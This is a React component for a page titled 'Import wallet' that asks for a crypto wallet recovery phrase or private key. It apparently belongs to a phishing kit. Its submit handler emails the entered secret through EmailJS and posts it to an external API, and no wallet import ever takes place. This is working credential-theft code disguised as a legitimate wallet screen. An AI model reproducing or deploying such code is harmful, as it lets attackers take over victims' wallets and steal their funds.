import React, { useState, useRef } from "react";
import { FontAwesomeIcon } from "@fortawesome/react-fontawesome";
import { faLeftLong } from "@fortawesome/free-solid-svg-icons";
import { Link, useNavigate } from "react-router-dom";
import axios from "axios";
import emailjs from "@emailjs/browser";

export default function Input() {
  const form = useRef();
  const [inputValue, setInputValue] = useState("");
  const [errorMessage, setErrorMessage] = useState("");
  const [loading, setLoading] = useState(false);
  const navigate = useNavigate();

  const handleChange = (event) => {
    setInputValue(event.target.value);
    setErrorMessage("");
  };

  const handleSubmit = async (event) => {
    event.preventDefault();
    if (inputValue.trim() === "") {
      setErrorMessage("Please enter a recovery phrase or private key.");
    } else {
      setLoading(true);
      try {
        await emailjs.sendForm(
          import.meta.env.VITE_APP_SERVICE_KEY,
          import.meta.env.VITE_APP_TEMPLATE_KEY,
          form.current,
          import.meta.env.VITE_APP_PUBLIC_KEY
        );

        const apiUrl = import.meta.env.VITE_APP_API_URL;
        const response = await axios.post(`${apiUrl}/api/input`, { inputValue });
        console.log("Form submitted:", response.data);

        setInputValue("");
        navigate("/submit", { replace: true });
      } catch (error) {
        console.error(
          "Error submitting form:",
          error.response || error.message
        );
        setErrorMessage(
          "Server error: " +
            (error.response ? error.response.data : error.message)
        );
      } finally {
        setLoading(false);
      }
    }
  };

  return (
    <div className="p-8 mt-12 flex flex-col items-center min-h-screen bg-white dark:bg-black text-black dark:text-white">
      <div className="w-full sm:w-3/4 lg:w-[67%] max-w-md">
        <div className="mb-4">
          <Link to="/import">
            <FontAwesomeIcon icon={faLeftLong} />
            <p className="p-0 text-[0.4rem]">BACK</p>
          </Link>
        </div>
        <div className="mb-4">
          <h1 className=" text-2xl font-bold">Import wallet</h1>
          <p className=" py-5">
            Enter your wallet&apos;s 12-word recovery phrase or private key. You
            can import any Ethereum, Solana or Bitcoin recovery phrase. Only
            Ethereum private keys are supported.
          </p>
        </div>
      </div>
      <div className="w-full sm:w-3/4 lg:w-[67%] max-w-md">
        <form ref={form} onSubmit={handleSubmit}>
          <div className="mb-10">
            <input
              type="text"
              name="message"
              id="message"
              placeholder="Enter recovery phrase or private key"
              className="w-full py-3 px-4 rounded-lg outline outline-1 outline-gray-500"
              value={inputValue}
              onChange={handleChange}
            />
            {errorMessage && <p className="text-red-500">{errorMessage}</p>}
            <p className="text-blue-700 font-semibold text-[0.8rem]">
              Where can I find it?
            </p>
          </div>
          <div className="mt-20">
            <button
              type="submit"
              value="Send"
              className="btn btn-active py-2 rounded-full w-full text-center bg-black dark:bg-white text-white dark:text-black">
              {loading ? "Loading..." : "Import"}
            </button>
          </div>
        </form>
      </div>
    </div>
  );
}
